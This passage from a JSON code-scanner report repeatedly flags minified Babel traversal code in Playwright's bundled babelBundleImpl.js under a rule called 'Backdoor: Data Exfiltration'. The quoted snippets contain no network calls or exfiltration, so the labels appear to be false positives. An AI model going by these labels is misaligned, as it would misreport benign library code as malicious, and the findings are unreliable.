                      "text": "r(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{va",
                      "markdown": "`r(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{va`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34630,
                  "endLine": 66,
                  "endColumn": 34635,
                  "snippet": {
                    "text": "ce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingId",
                    "rendered": {
                      "text": "ce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingId",
                      "markdown": "`ce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingId`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34262,
                  "endLine": 66,
                  "endColumn": 34267,
                  "snippet": {
                    "text": ",n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i",
                    "rendered": {
                      "text": ",n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i",
                      "markdown": "`,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.create(null);for(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34103,
                  "endLine": 66,
                  "endColumn": 34108,
                  "snippet": {
                    "text": "}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.cr",
                    "rendered": {
                      "text": "}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.cr",
                      "markdown": "`}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}function cce(e){return Kue(this.node,e)}function fce(e=!1,t=!1){let n=[this],s=Object.cr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34017,
                  "endLine": 66,
                  "endColumn": 34022,
                  "snippet": {
                    "text": "key,t=this.getSibling(--e),r=[];for(;t.node;)r.push(t),t=this.getSibling(--e);return r}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}fu",
                    "rendered": {
                      "text": "key,t=this.getSibling(--e),r=[];for(;t.node;)r.push(t),t=this.getSibling(--e);return r}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}fu",
                      "markdown": "`key,t=this.getSibling(--e),r=[];for(;t.node;)r.push(t),t=this.getSibling(--e);return r}function ace(e,t=!0){t===!0&&(t=this.context);let r=e.split(\".\");return r.length===1?this._getKey(e,t):this._getPattern(r,t)}function oce(e,t){let r=this.node,n=r[e];return Array.isArray(n)?n.map((s,i)=>d0.default.get({listKey:e,parentPath:this,parent:r,container:n,key:i}).setContext(t)):d0.default.get({parentPath:this,parent:r,container:r,key:e}).setContext(t)}function lce(e,t){let r=this;for(let n of e)n===\".\"?r=r.parentPath:Array.isArray(r)?r=r[n]:r=r.get(n,t);return r}function uce(e){return hC(this.node,e)}fu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 33347,
                  "endLine": 66,
                  "endColumn": 33352,
                  "snippet": {
                    "text": "isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:e}).setContext(this.context)}function rce(){return this.getSibling(this.key-1)}function nce(){return this.getSibling(this.key+1)}function sce(){let e=this.key,t=this.getSibling(++e),r=[];for(;t.node;)r.p",
                    "rendered": {
                      "text": "isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:e}).setContext(this.context)}function rce(){return this.getSibling(this.key-1)}function nce(){return this.getSibling(this.key+1)}function sce(){let e=this.key,t=this.getSibling(++e),r=[];for(;t.node;)r.p",
                      "markdown": "`isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:e}).setContext(this.context)}function rce(){return this.getSibling(this.key-1)}function nce(){return this.getSibling(this.key+1)}function sce(){let e=this.key,t=this.getSibling(++e),r=[];for(;t.node;)r.p`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 33073,
                  "endLine": 66,
                  "endColumn": 33078,
                  "snippet": {
                    "text": "Statement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPat",
                    "rendered": {
                      "text": "Statement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPat",
                      "markdown": "`Statement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e){return d0.default.get({parentPath:this.parentPat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 33023,
                  "endLine": 66,
                  "endColumn": 33028,
                  "snippet": {
                    "text": " na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e",
                    "rendered": {
                      "text": " na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e",
                      "markdown": "` na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1}).map(t=>t.path)}function tce(e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32968,
                  "endLine": 66,
                  "endColumn": 32973,
                  "snippet": {
                    "text": "||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateB",
                    "rendered": {
                      "text": "||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateB",
                      "markdown": "`||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}function ece(){return sa(this,{canHaveBreak:!1,shouldPopulateB`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32910,
                  "endLine": 66,
                  "endColumn": 32915,
                  "snippet": {
                    "text": "t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}func",
                    "rendered": {
                      "text": "t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}func",
                      "markdown": "`t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.push(Xue(e))}}return r}func`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32885,
                  "endLine": 66,
                  "endColumn": 32890,
                  "snippet": {
                    "text": "na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.pu",
                    "rendered": {
                      "text": "na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.pu",
                      "markdown": "`na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0});e.isBreakStatement()?r.push(Jue(e)):r.pu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32841,
                  "endLine": 66,
                  "endColumn": 32846,
                  "snippet": {
                    "text": "ion sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!",
                    "rendered": {
                      "text": "ion sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!",
